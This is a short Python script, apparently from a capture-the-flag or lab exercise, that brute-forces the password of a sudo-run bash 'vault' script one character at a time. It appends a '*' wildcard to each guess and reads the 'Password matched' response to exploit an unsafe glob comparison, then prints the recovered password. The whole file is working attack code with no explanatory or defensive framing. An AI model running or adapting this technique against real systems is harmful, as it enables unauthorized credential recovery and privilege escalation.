import subprocess
import string

password=''

charset = string.ascii_letters + string.digits

while True:
        found = False
        for char in charset:
                passw = password + char  + '*'
                print('PASS CHECK:',passw)
                proc = subprocess.Popen(
                ["sudo", "/usr/bin/bash", "/usr/bin/vault"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
                )
                stdout, stderr = proc.communicate(input=passw + "\n")
                if 'Password matched' in stdout:
                        password += char
                        found = True
                        break
        if not found:
                break
print('PASSWORD IS:',password)